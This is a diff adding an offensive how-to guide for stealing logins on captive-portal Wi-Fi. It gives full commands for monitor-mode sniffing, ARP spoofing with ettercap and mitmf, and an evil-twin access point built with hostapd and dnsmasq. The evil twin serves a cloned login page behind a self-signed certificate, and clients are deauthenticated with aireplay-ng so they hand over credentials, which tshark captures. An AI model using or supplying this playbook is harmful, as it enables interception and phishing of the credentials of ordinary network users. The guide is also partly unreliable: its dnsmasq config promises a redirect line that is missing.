@@ -1,0 +1,286 @@
+On networks using a captive portal we have different solutions:
+* Change MAC address to one of a connected client
+* Sniff logins in monitor mode (only HTTP portals)
+* Connect and sniff logins after running an arp spoofing attack (only HTTP portals)
+* Create a Fake AP and ask users to login
+
+### Sniff logins in monitor mode
+
+Be sure to set the wireless card in monitor mode:
+```sh
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+```
+
+Now we can check which is our target network by running:
+```sh
+airodump-ng wlan0
+```
+
+Once we find out which is the network we are interested in, we want to create a
+capture file to analyze with wireshark only for that network, we can do that by
+launching airodump on the target:
+```sh
+airodump-ng --bssid <target_mac> --channel <channel_id> --write <file_prefix> wlan0 
+```
+
+Now that we have the capture file we can open it with wireshark, at this point
+we are only interested in the HTTP POST requests, because that's where generally
+credentials are passed, so we may use some wireshark filter to locate HTTP
+requests or more specifically HTTP POST requests.
+
+Inspect these POST requests to find the credentials, and the game is done.
+
+### Sniff Credentials by ARP Spoofing
+
+
+We must connect to the network, and once connected we may use many tools to
+perform ARP spoofing, let's see a couple of options:
+```sh
+ettercap -Tq -M arp:remote -i wlan0 ///
+# this will perform ARP spoofing for all the clients on the network
+```
+
+Another option may be using `mitmf` by doing:
+```sh
+mitmf --arp --spoof -i wlan0 --gateway <gateway_address>
+# the gateway address can be retrieved by issuing a `route -n`
+```
+
+### Sniff Credentials by Fake AP
+
+In this case what we do is:
+* Clone the login page used by the captive portal
+* Create a fake AP with same/similar name
+* Deauthenticate users so that they will use the fake network with cloned page
+* Sniff credentials
+
+
+#### Cloning the Login Page
+
+In order to clone the login page used by the captive portal, we first connect to
+the open network, then we can just `save as` the webpage from a browser like
+firefox.
+
+Once the page html+directory with other contents is saved, we have to copy it in
+the webroot directory and we can rename the main html page as `index.html`.
+Then, now we can start the web server process such as apache2, and make a double
+check by trying to connect to our IP address.
+
+Notice that we may need to modify the web page to put absolute links, we must
+check for each href related to images, css, js or any other file if it contains
+an initial slash, if it does not contain an initial slash, we must insert it.
+A search and replace with the file directory name is a good idea here, we just
+have to replace with the same name but with added an initial slash before the
+directory name.
+
+Another additional step we may need to perform is to check if the login input
+box are inside an html form, generally this is the case, but it may not be like
+this. In the case there is no form, it is always a better idea to insert it
+manually by modifying the html page. This is done because having a form allows a
+simpler sniffing of the credentials.
+Generally the html minimum code to wrap around the username, password and login
+button is:
+```html
+<form method="post" action="/index.html">
+...
+</form>
+```
+
+Sommetimes for the login button if we have added form, we may need to add a
+submit button, this can be done by adding inside the form the following html:
+```html
+<form method="post" action="/index.html">
+...
+<input type="submit" value="Log In">
+</form>
+```
+We may also need to save the style of the button, we can again do this by
+saving the value of the "value" string from the original html and copy it inside
+the input tag like this:
+```html
+<form method="post" action="/index.html">
+...
+<input style="string..." type="submit" value="Log In">
+</form>
+```
+
+The more we know about html and css the more we will be able to reproduce a
+verbatim copy of the original login page.
+
+
+#### Creating a Fake AP
+
+In order to create a fake AP we must have three elements:
+* A router broadcasting a signal -> we can use `hostapd` 
+* A DHCP server to provide clients IP addresses -> we can use `dnsmasq` 
+* A DNS server to provide clients name resolutions -> we can use `dnsmasq` 
+
+Once hastapd and dnsmasq are installed we can proceed by stopping networkmanager
+which can cause problems:
+```sh
+service network-manager stop
+```
+Then we have to enable packet forwarding from our machine but also flush all 
+iptables rules, generally we shouldn't have any conflicting
+rules, but for the sake of being sure, we may want to flush all rules by doing:
+```sh
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+iptables -P FORWARD ACCEPT
+```
+At this point nothing should interfere with our attack.
+
+Now let's configure dnsmasq, we may have a basic configuration file like this
+one:
+```dnsmasq.conf
+#Set the wifi interface
+interface=wlan0
+
+#Set the IP range that can be given to clients,
+# in this case each IP can last only 8 hours
+dhcp-range=10.0.0.10,10.0.0.100,8h
+
+#Set the gateway IP address
+dhcp-option=3,10.0.0.1
+
+#Set dns server address
+dhcp-option=6,10.0.0.1
+
+#Redirect all requests to 10.0.0.1, which will be our machine IP address
+```
+
+Once the configuration is done we can launch dnsmasq, by doing:
+```sh
+dnsmasq -C /path/to/config/file.conf
+```
+
+Now we have a DNS and DHCP server running.
+
+Now in order to setup hostapd to create the fake AP we just create a
+configuration file like this:
+```hostapd.conf
+#Set wifi interface
+interface=wlan0
+
+#Set network name (SSID)
+ssid=royal wifi v2
+
+#Set channel
+channel=1
+
+#Set driver
+driver=nl80211
+```
+
+Now to launch hostapd we do:
+```sh
+hostapd /path/to/config/file.conf -B
+# the -B flag will run the command in background
+```
+
+Now we have to set our IP Address accordingly, indeed if we do `ifconfig wlan0`
+we can see that we still do not have an IP address assigned, in order to assign
+an IP address to our wlan0 network interface we do:
+```sh
+ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
+# use the same ip address mentioned in the dnsmasq configuration
+```
+
+Now we can start the web server service, e.g., in the case of apache we do:
+```sh
+systemctl start apache2
+```
+
+Now we are still not done, since we want to create a real captive portal
+experience, so there are still some small things we have to handle, for example
+we need some rewrite rules on apache, in order to do this we need to modify the
+apache2 configuration file which is generally in:
+
+`/etc/apache2/sites-enabled/000-default.conf`
+
+from here we need to rewrite rules, let's append the following piece of
+configuration:
+```sh
+<Directory "/var/www/html">
+    RewriteEngine On
+    RewriteBase /
+    RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+    RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+    
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+```
+
+Notice that inside the already existing tag called `<VirtualHost :80>`, we have
+to add a line which states:
+```sh
+ErrorDocument 404 /
+# this is used to redirect to the index page for each resource which is not found
+```
+
+Now this is almost like a real captive portal, but the only thing is that
+because of HSTS when users browse to facebook or google or other big websites
+with HSTS enabled they will still have a "Secure Connection Failed", so in order
+to solve this issue we may use a fake SSL certificate.
+
+We have to enable https on apache, so we first generate a fake SSL certificate,
+by doing:
+```sh
+openssl req -new -x509 -days 365 -out /path/to/dir/cert.pem -keyout /path/to/dir/cert.key
+# we are specifying a certificate which will be valid for 365 days
+# and then we specify the output directory where the pem and key files will be
+# saved
+```
+Let's insert random info when asked, and then we will have the `.pem` and the
+`.key` file, at this point to enable https on apache we can do:
+```sh
+a2enmod ssl
+```
+and then let's open the configuration file as before which is at
+`/etc/apache2/sites-enabled/000-default.conf`
+
+at this point we have to add a new virtualhost tag entry for port 443, by
+inserting:
+```sh
+<VirtualHost *:443>
+    SSLEngine   On
+    SSLCertificateFile      /path/to/dir/cert.pem
+    SSLCertificateKeyFile   /path/to/dir/cert.key  
+
+</VirtualHost>
+```
+
+Now we also have to enable port 443, to do this we need to momdify the file
+`/etc/apache2/ports.conf`. We must have:
+```sh
+Listen 80
+Listen 443
+```
+
+Now everything is done and we can restart apache2, when we do this, the password
+related to the certificate will be asked and everything will be on now.
+We can test now by browsing both to our http and https website versions on our
+IP address.
+
+Now we can start sniffing on our network interface by doing:
+```sh
+tshark -i wlan0 -w ap_name.cap
+# now it will start to capture the packets
+```
+
+Now our network interface is there sniffing packets and we can start to
+deauthenticate users from the network by issuing;
+```sh
+aireplay-ng --deauth 0 -a <ap_mac> -c <client_mac> wlan0
+```
+
+Now the game is done, and users will issue their credentials hopefully.
+We can start to analyze the .cap file with wireshark and search for HTTP POST
+requests, and we will see credentials in the request packet.
